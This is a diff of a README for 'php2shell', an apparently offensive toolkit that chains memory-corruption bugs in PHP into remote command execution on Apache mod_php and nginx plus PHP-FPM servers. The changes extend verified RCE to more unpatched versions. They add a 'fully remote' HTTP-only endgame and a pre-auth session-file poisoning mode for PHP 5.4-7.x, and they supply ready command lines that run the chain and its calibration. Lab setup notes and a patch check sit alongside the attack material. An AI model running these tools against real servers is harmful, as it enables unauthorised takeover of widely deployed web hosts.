@@ -37,6 +37,10 @@ not match the profile.
 | PHP 8.5.10 aarch64 | `php:8.5.10-apache` | `php-8.5.10-bookworm-aarch64` | yes | yes | **yes** | `uid=33(www-data)` |
 | PHP 8.4.26 amd64 | `php:8.4.26-apache` | `php-8.4.26-bookworm-amd64` | yes | yes | **yes** | reference build |
 | PHP 8.4.26 FPM amd64 | php-8.4.26 source tarball (nginx+FPM) | `php-8.4.26-fpm` | http (stale string) | http (stale string) | **yes** | `BG(unserialize)` chain; two-slot reclaim; HTTP-only `no-oracle` endgame |
+| PHP 8.4.25 FPM amd64 | php-8.4.25 source tarball (nginx+FPM) | `php-8.4.25-fpm` | http (stale string) | http (stale string) | **yes** | same chain, calibrated geometry |
+| PHP 8.4.0 FPM amd64 | php-8.4.0 source tarball (nginx+FPM) | `php-8.4.0-fpm` | http (stale string) | http (stale string) | **yes** | earliest 8.4 release of the branch |
+| PHP 8.3.35 FPM amd64 | php-8.3.35 source tarball (nginx+FPM) | `php-8.3.35-fpm` | http (stale string) | http (stale string) | **yes** | last vulnerable 8.3 |
+| PHP 8.2.34 FPM amd64 | php-8.2.34 source tarball (nginx+FPM) | `php-8.2.34-fpm` | http (stale string) | http (stale string) | **yes** | last vulnerable 8.2 |
 | PHP 8.4.25 aarch64 | `php:8.4.25-apache` | `php-8.4.25-bookworm-aarch64` | yes | yes | **yes** | probabilistic stage 3; retries |
 | PHP 8.5.0 aarch64 | `php:8.5.0-apache` | `php-8.5.0-bookworm` | yes | yes | no | stage-3 layout not found |
 | PHP 8.3.35 aarch64 | `php:8.3.35-apache` | `php-8.3.35-bookworm-aarch64` | yes | yes | no | stage-3 reference alive |
@@ -48,13 +52,14 @@ not match the profile.
 | PHP 7.4.33 aarch64 | `php:7.4-apache` | `php-7.4.33-bookworm-aarch64` | no | no | no | UAF; leak shape differs |
 | PHP 8.2.0 aarch64 | `php:8.2.0-apache` | — (offsets only) | n/a | n/a | no | no heap profile |
 
-**14 profiles (13 heap + 1 FPM), 6 with verified RCE. Offsets extracted for
-12 builds.** The FPM profile has no Apache leak stages: `endgame` resolves the stale
-`BG(unserialize)` struct and the php-fpm PIE base with the
-`/proc/<pid>/mem` oracle each run; `no-oracle` leaks the two absolute bases
-over HTTP from a stale-session string OOB read, or takes them from
-`--chunk`/`--pie` or local `/proc/<pid>/maps`, then brute-forces the two
-slots ([docs/fpm-chain.md](docs/fpm-chain.md)).
+**18 profiles (13 Apache/mod_php + 5 PHP-FPM), 10 with verified RCE. Offsets
+extracted for 12 Apache builds.** The PHP-FPM profiles have no Apache leak
+stages: the chain abuses the stale `BG(unserialize)` struct instead.
+`no-oracle` is fully remote — it leaks the chunk and php-fpm PIE bases over
+HTTP from a stale-session string OOB read (or takes them from `--chunk`/
+`--pie`) and fires without touching `/proc/<pid>/mem`; the lab-only `endgame`
+can still read them through the oracle
+([docs/fpm-chain.md](docs/fpm-chain.md)).
 
 `Heap leak` is stage 1 and `libphp leak` is stage 2; `oracle (heap)` and
 `oracle (PIE)` mean the FPM chain reads the heap chunk and the php-fpm PIE base
@@ -90,9 +95,17 @@ default retries because its stage 3 is probabilistic.
   CVEs against PHP-FPM behind nginx: an out-of-memory request leaves the
   `BG(unserialize)` pointer stale, the next request reclaims the struct, and a
   forged session variable turns the session shutdown path into `zif_system`.
-  Verified command execution on 8.4.26; `patchcheck` proves 8.4.27 is clean.
-  Requires a `/proc/<pid>/mem` oracle (`ptrace_scope=0`), so it runs in the
-  local laboratory mode (`--builder` endpoint for the 4 MB arm phase).
+  Verified command execution on 8.2.34, 8.3.35, 8.4.0, 8.4.25 and 8.4.26;
+  `patchcheck` proves 8.4.27 is clean. `calibrate` derives the leak and
+  reclaim geometry of any 8.0+ build over HTTP only; `poison` (the
+  `session.upload_progress` session-file plant) covers PHP 5.4-7.x where the
+  struct-freeing chain does not apply; `php2shell_fpm_matrix.py` verifies the
+  whole unpatched set in one run. The `no-oracle` endgame is fully remote —
+  no `/proc/<pid>/mem`, no local shell.
+- **PHP version registry** — `tools/php2shell_fpm_versions.py` is the single
+  source of truth for the affected-version matrix: `is_vulnerable()`,
+  `fixed_in()`, `source_is_fixed()` classifies a tarball by the presence of the
+  upstream fix marker instead of trusting a version string.
 - **Calibration factory** — `php2shell_calibrate.py` discovers stages 1-2 and
   verifies stage 3 with a real proof before writing `rce: true`;
   `php2shell_matrix.py` runs the factory over a matrix of images.
@@ -159,25 +172,43 @@ python3 tools/php2shell_inventory.py
 
 ### PHP-FPM laboratory (no Docker)
 
-The FPM chain runs against an amd64 user-prefix PHP build with nginx. The
-default `endgame` uses the `/proc/<pid>/mem` oracle (`ptrace_scope=0`);
-`no-oracle` avoids it at exploit time and leaks chunk/PIE over HTTP by default:
+The FPM chain runs against an amd64 user-prefix PHP build with nginx — no
+Docker, no root. Build nginx and a vulnerable PHP (any of 8.2.34, 8.3.35,
+8.4.0, 8.4.25 or 8.4.26), then start the lab for that version:
 
 ```sh
-python3 tools/php2shell_fpm_labs.py up --version 8.4.26
+lab/fpm/build_nginx.sh
+lab/fpm/build_php.sh 8.4.26
+python3 tools/php2shell_fpm_labs.py up --only 8.4.26
+python3 tools/php2shell_fpm_labs.py status
+```
+
+The default `endgame` uses the `/proc/<pid>/mem` oracle (`ptrace_scope=0`);
+`no-oracle` is fully remote and leaks chunk/PIE over HTTP by default:
+
+```sh
 python3 tools/php2shell_auto.py -u http://127.0.0.1:8110/index.php --sapi fpm \
   --builder http://127.0.0.1:8111
 # or drive the chain directly:
 python3 tools/php2shell_fpm.py \
   --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 --version 8.4.26 \
   endgame
-# no /proc/<pid>/mem at exploit time (HTTP leak; --chunk/--pie override)
+# fully remote RCE: HTTP leak, no /proc at exploit time (--chunk/--pie override)
 python3 tools/php2shell_fpm.py \
   --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 --version 8.4.26 \
   --command 'id>out/p1' --proof-file out/p1 no-oracle
 # print only the leaked bases
 python3 tools/php2shell_fpm.py \
   --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 --version 8.4.26 leak
+# derive a profile for any 8.0+ build over HTTP, then trust it:
+python3 tools/php2shell_fpm.py \
+  --version 8.2.34 --base http://127.0.0.1:8406 --builder http://127.0.0.1:8407 calibrate
+# PHP <= 7.x: plant chosen bytes into a chosen session file (pre-auth)
+python3 tools/php2shell_fpm.py \
+  --version 7.4.33 --base http://127.0.0.1:8336 --builder http://127.0.0.1:8337 \
+  poison --sid plant7x --payload 'PLANTED_MARKER'
+# verify the remote chain on every unpatched build in one run (7.2 -> 8.4)
+python3 tools/php2shell_fpm_matrix.py
 python3 tools/php2shell_fpm_labs.py down
 ```
 
@@ -268,10 +299,12 @@ The shipped calibration targets:
 A hardened production PHP (128M+, `display_errors=Off`, multiple workers, FPM)
 does not match the shipped Apache calibration. Multi-worker Apache targets are
 handled with `--pin-workers`; `display_errors=Off` remains an open research
-item. The FPM chain has its own requirements: nginx in front of FPM, a
-`/proc/<pid>/mem` oracle (`yama ptrace_scope=0`), a small consumer pool
-(`memory_limit=8M`, cleanup on) and a larger builder pool (64M, cleanup off)
-for the 4 MB arm phase — see [docs/fpm-chain.md](docs/fpm-chain.md).
+item. The FPM chain has its own requirements: nginx in front of FPM, a small
+consumer pool (`memory_limit=8M`, cleanup on) and a larger builder pool (64M,
+cleanup off) for the 4 MB arm phase, sharing a session directory. The
+`no-oracle` endgame is fully remote; only the lab `endgame`/`primitive` modes
+additionally need `/proc/<pid>/mem` (`yama ptrace_scope=0`) — see
+[docs/fpm-chain.md](docs/fpm-chain.md).
 
 ## Multi-worker targets
 
@@ -350,19 +383,29 @@ git -C vendor/php2shell-upstream checkout 4586f5c
 
 ```text
 catalog/vulnerable.json        vulnerable branches and fixed releases
-.github/workflows/ci.yml       tests and gitleaks
-profiles/*.json                heap profiles (offsets, heap params, verified flag)
+.github/workflows/ci.yml       tests, profile validation and gitleaks
+.github/workflows/live-fpm.yml manual live FPM lab (build + exploit 8.4.x)
+.github/workflows/release.yml  GitHub release on v* tags
+profiles/*.json                build profiles (offsets, heap params, verified flag)
+profiles/*-fpm.json            verified PHP-FPM profiles (8.2.34 - 8.4.26)
+profiles/schema.json           generic build-profile validator
+profiles/fpm-schema.json       strict PHP-FPM profile validator
 profiles/offsets/*.json        ELF symbol offsets per image
+requirements-dev.txt           jsonschema + ruff (dev/CI)
 vendor/                        generated upstream checkout (git-ignored)
 tools/
   php2shell_auto.py            version-aware dispatcher (Apache + FPM)
-  php2shell_fpm.py             PHP-FPM chain client (arm/reclaim/fire)
+  php2shell_fpm.py             PHP-FPM client (calibrate/poison/leak/no-oracle/endgame)
   php2shell_fpm_labs.py        user-prefix FPM laboratories (no Docker)
-  php2shell_calibrate.py       profile generator with proof verification
-  php2shell_matrix.py          profile factory over image tags
+  php2shell_fpm_matrix.py      verify the remote chain on every unpatched build
+  php2shell_fpm_profile.py     draft FPM profile generator (nm + offsets)
+  php2shell_fpm_versions.py    affected-version registry (single source of truth)
+  php2shell_fpm_offsets.c      struct offsets compiled per build
+  php2shell_calibrate.py       Apache profile generator with proof verification
+  php2shell_matrix.py          Apache profile factory over image tags
   php2shell_rce.py             manual upstream launcher
   php2shell_assess.py          exposure/leak assessment (no RCE claim)
-  php2shell_labs.py            disposable local laboratories
+  php2shell_labs.py            disposable local Apache laboratories
   php2shell_offsets.py         ELF offset extraction for any image
   php2shell_inventory.py       profile/offset table
   php2shell_paths.py           upstream checkout resolution
@@ -372,7 +415,7 @@ tools/
 lab/
   wordpress/                   WordPress 8.3.33 + mod_php laboratory
   rce/                         single-worker calibration lab and configs
-  fpm/                         nginx + PHP-FPM laboratory (8.4.26 / 8.4.27)
+  fpm/                         nginx + PHP-FPM laboratory (7.2 - 8.4; build_*.sh)
 docs/
   php2shell-analysis.md        technical analysis
   fpm-chain.md                 PHP-FPM chain and laboratory
@@ -450,10 +493,12 @@ OOM, which is why the 8.4/8.5 stage-3 carrier does not transfer.
 
 ## Limitations
 
-- **mod_php prefork and FPM.** The Apache chain needs prefork + `mod_php`;
-  the FPM chain needs nginx + FPM with a `/proc/<pid>/mem` oracle
-  (`ptrace_scope=0`) and two endpoints (consumer + builder pool). Other SAPIs
-  are not supported.
+- **mod_php prefork and FPM.** The Apache chain needs prefork + `mod_php`; the
+  FPM chain needs nginx + FPM with two endpoints (a low-memory consumer pool and
+  a high-memory builder pool) and a session directory shared between them. Only
+  the lab-only `endgame`/`primitive` oracle modes need `/proc/<pid>/mem`
+  (`ptrace_scope=0`); `no-oracle` is fully remote. Other SAPIs are not
+  supported.
 - **One worker / pinning.** Without pinning, the per-worker session state breaks
   stage 1.
 - **Per-build offsets.** A profile is tied to a `libphp.so` build; the same
